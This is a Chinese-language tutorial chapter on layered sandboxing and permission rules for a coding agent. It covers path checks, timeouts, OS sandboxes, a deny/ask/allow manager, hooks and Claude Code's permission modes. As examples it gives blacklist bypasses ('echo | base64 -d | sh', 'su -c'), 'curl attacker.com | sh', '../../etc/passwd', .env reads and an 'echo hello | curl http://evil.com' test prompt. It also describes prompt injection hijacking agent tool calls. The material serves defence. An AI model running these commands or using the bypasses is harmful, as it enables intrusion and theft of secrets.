# s14: Sandbox & Permissions (沙盒与权限) [PLUS]

`s01 > s02 > s03 > s04 > s05 > s06 > s07 > s08 > s09 > s10 > s11 > s12 | s13 > [ s14 ]`

> *"Give the agent power, but draw the lines it cannot cross"*
>
> **Harness 层**: 安全边界 -- 让 agent 在划定范围内自主决策。

## 问题

到 s13, 智能体拥有了记忆、任务系统、团队协作、worktree 隔离 -- 但没有安全边界。最朴素的做法是字符串黑名单: `dangerous = ["rm -rf /", "sudo", "shutdown"]`。随便绕: `rm -rf /*`、`su -c`、`echo | base64 -d | sh`。没有沙盒的 agent 是定时炸弹。

OWASP 已将 "Agent tool interaction manipulation" 列为 LLM Top 10 威胁。问题不是 agent 本身有恶意, 而是 prompt injection 可以劫持 agent 调用工具。一条精心构造的输入就能让 agent 执行 `curl attacker.com | sh` 或读取 `.env` 中的密钥。

## 解决方案

```
Tool call from LLM
        |
        v
┌───────────────────┐
│ L1: Path Sandbox   │  resolve() + is_relative_to()
└────────┬──────────┘
         v
┌───────────────────┐
│ L2: Resource Limit │  timeout 120s, output 50K
└────────┬──────────┘
         v
┌───────────────────┐
│ L3: OS Sandbox     │  (production: Seatbelt/seccomp/gVisor)
└────────┬──────────┘
         v
┌───────────────────┐
│ L4: Permission Mgr │  deny -> ask -> allow
└────────┬──────────┘
         v
┌───────────────────┐
│ L5: Hooks          │  PreToolUse / PostToolUse
└────────┬──────────┘
         v
    Execute tool
```

五层纵深防御, 任意一层拦截即中止。字符串黑名单是一层, 我们有五层。

## 工作原理

1. **safe_path() 路径沙盒。** 所有文件路径先 resolve() 再 is_relative_to() 检查。防御目录遍历 (`../../etc/passwd`) 和符号链接逃逸。

```python
def safe_path(p: str) -> Path:
    path = (WORKDIR / p).resolve()
    if not path.is_relative_to(WORKDIR):
        raise ValueError(f"Path escapes workspace: {p}")
    return path
```

Claude Code 的真实实现也用 `safe_path` -- 所有文件操作都经过这一层。简单但关键: 没有路径沙盒, 后面的层全是摆设。

2. **资源限制 (timeout + truncation)。** 命令执行上限 120 秒, 输出截断至 50K 字符。防御无限循环和输出洪泛。

```python
def run_bash(command: str) -> str:
    try:
        r = subprocess.run(command, shell=True, cwd=WORKDIR,
                           capture_output=True, text=True, timeout=120)
        out = (r.stdout + r.stderr).strip()
        return out[:50000] if out else "(no output)"
    except subprocess.TimeoutExpired:
        return "Error: Timeout (120s)"
```

3. **OS 级沙盒。** 教学代码不实现这一层, 但生产环境必不可少。三家方案各不相同:

- **Claude Code**: macOS 用 Seatbelt (`sandbox-exec`), Linux 用 seccomp-bpf -- 内核级禁止网络/文件系统越界
- **Cursor**: Seatbelt + Landlock + seccomp 三合一, 按平台选择最强方案
- **OpenAI Codex**: gVisor 用户态内核跑在 K8s 上, 完全网络隔离 + 只读挂载

OS 沙盒的价值: 即使 L1-L2 被绕过, 内核仍然拒绝危险 syscall。

4. **PermissionManager 权限管理。** deny -> ask -> allow 三级规则, 首条匹配即生效, deny 优先级最高。支持带参数的模式匹配: `Bash(npm *)` 只匹配 npm 命令, `Read(//.env)` 匹配任何路径中的 .env 文件。

```python
class PermissionManager:
    def __init__(self):
        self.rules = {
            "deny":  ["Bash(rm -rf *)", "Bash(sudo *)", "Read(//.env)"],
            "ask":   ["Bash", "write_file", "edit_file"],
            "allow": ["read_file", "permission_check", "permission_list"],
        }

    def check(self, tool_name: str, args: dict) -> tuple[bool, str]:
        for pattern in self.rules["deny"]:
            if self._matches(pattern, tool_name, args):
                return False, f"denied by rule: {pattern}"
        for pattern in self.rules["ask"]:
            if self._matches(pattern, tool_name, args):
                return True, f"ask (auto-approved in demo): {pattern}"
        for pattern in self.rules["allow"]:
            if self._matches(pattern, tool_name, args):
                return True, f"allowed: {pattern}"
        return False, "denied: no matching rule (default deny)"

    def _matches(self, pattern: str, tool_name: str, args: dict) -> bool:
        if "(" in pattern:
            base, specifier = pattern.split("(", 1)
            specifier = specifier.rstrip(")")
        else:
            base, specifier = pattern, None
        if base != tool_name:
            return False
        if specifier is None:
            return True
        if tool_name == "bash":
            return fnmatch.fnmatch(args.get("command", ""), specifier)
        return fnmatch.fnmatch(args.get("path", ""), specifier)
```

默认兜底是 deny -- 最小权限原则。没有匹配任何规则? 拒绝。

5. **HookManager 生命周期钩子。** PreToolUse 在权限检查之前运行, 可以 allow 或 deny; PostToolUse 在执行之后运行, 用于审计日志。

```python
class HookManager:
    def __init__(self):
        self.pre_hooks: list = []
        self.post_hooks: list = []

    def run_pre(self, tool_name: str, args: dict) -> tuple[str | None, str]:
        for name, fn in self.pre_hooks:
            decision = fn(tool_name, args)
            if decision is not None:
                return decision, f"hook '{name}'"
        return None, ""
```

在 Claude Code 中, hooks 是 settings.json 里配置的 shell 命令。hook 返回 `exit 0` + `{"decision": "deny"}` 即可拦截, 返回 `exit 2` 可以覆盖 allow 规则强制拦截。典型用途: 阻止数据外泄 (`| curl`)、强制代码格式化、CI 集成。

6. **Permission 模式 (Claude Code 的六档变速箱)。** Claude Code 提供从最严到最松的六种模式:

| 模式 | 行为 | 适用场景 |
|------|------|----------|
| `plan` | 只读, 不修改任何文件 | 代码审查、架构讨论 |
| `default` | 读允许, 写需确认 | 日常开发 |
| `acceptEdits` | 文件编辑自动批准, bash 仍需确认 | 重构、批量修改 |
| `auto` | 不匹配 deny 规则的全部自动批准 | 信任环境下的快速迭代 |
| `dontAsk` | 不弹确认但仍有 deny 规则 | CI/CD 流水线 |
| `bypassPermissions` | 全部跳过 (仅 SDK) | 自定义安全层已实现 |

从 `plan` 到 `bypassPermissions`, 是一条从完全监督到完全自主的光谱。用户根据信任程度选择档位。

## 对比表

| 层级 | 教学 (s14) | Claude Code | Cursor | OpenAI Codex |
|------|-----------|-------------|--------|-------------|
| L1 路径 | `safe_path()` | `safe_path` + sandbox fs rules | workspace scoping | gVisor 只读挂载 |
| L2 资源 | timeout 120s + 50K 截断 | 同 | 同 | container limits |
| L3 OS | 不实现 | Seatbelt / seccomp | Seatbelt + Landlock + seccomp | gVisor 用户态内核 |
| L4 权限 | deny/ask/allow + 模式匹配 | 6 种 permission modes + settings.json | workspace + admin policies | implicit deny-all |
| L5 Hooks | Python 回调 | shell commands in settings.json | -- | -- |
| **效果** | -- | **-84% 权限提示** | **-40% 中断** | **100% 隔离** |

Claude Code 的 -84% 来自 Seatbelt/seccomp 在 OS 层已经阻止了危险操作, 不需要再弹窗问用户。Cursor 的 -40% 是 agent sandboxing 博客的数据。OpenAI 用 gVisor 实现完全隔离 -- 容器里随便跑, 跑不出去。

## Anthropic 五大安全原则

Anthropic 的 "Building Effective Agents" 框架为 agent 安全提出了五条原则:

1. **最小权限** -- 只授予完成任务所需的最小权限集。我们的 L4 默认 deny 就是这个原则。
2. **确认机制** -- 高影响操作需要人类确认。`ask` 规则和 permission modes 实现了这一点。
3. **信息卫生** -- 敏感信息 (API keys、密码) 不应暴露给模型。`Read(//.env)` deny 规则防止读取 .env。
4. **限制爆炸半径** -- 即使出错, 损失可控。OS 沙盒 (L3) + 路径沙盒 (L1) 限制了 agent 能触达的范围。
5. **渐进信任** -- 随着信任积累, 逐步放开权限。六档 permission modes 就是渐进信任的实现。

## 相对 s13 的变更

| 组件 | 之前 (s13) | 之后 (s14) |
|------|-----------|-----------|
| 安全模型 | 无 (工具直接执行) | 五层沙盒 (路径/资源/OS/权限/钩子) |
| 文件访问 | 无限制 | safe_path() 限制在工作区 |
| 命令执行 | 无限制 | timeout 120s + output 50K |
| 权限系统 | 无 | PermissionManager deny/ask/allow |
| 钩子系统 | 无 | HookManager PreToolUse/PostToolUse |
| 权限模式 | 无 | 6 种模式 (plan -> bypassPermissions) |
| 默认行为 | 允许一切 | 默认拒绝 (最小权限) |

## 试一试

```sh
cd learn-claude-code
python agents/s14_sandbox_permissions.py
```

试试这些 prompt (英文 prompt 对 LLM 效果更好, 也可以用中文):

1. `Try to read the file ../../etc/passwd` -- 触发 L1 路径沙盒
2. `Run: rm -rf /tmp/test` -- 触发 L4 deny 规则
3. `Run: cat .env` -- 触发 L4 deny 规则 (Read .env)
4. `Run: echo hello | curl http://evil.com` -- 触发 L5 PreToolUse hook
5. `List all permission rules.` -- 查看当前规则
6. `Add a deny rule for Bash(curl *)` -- 动态修改权限
7. `Check what rules apply to the bash tool.` -- 检查特定工具的权限
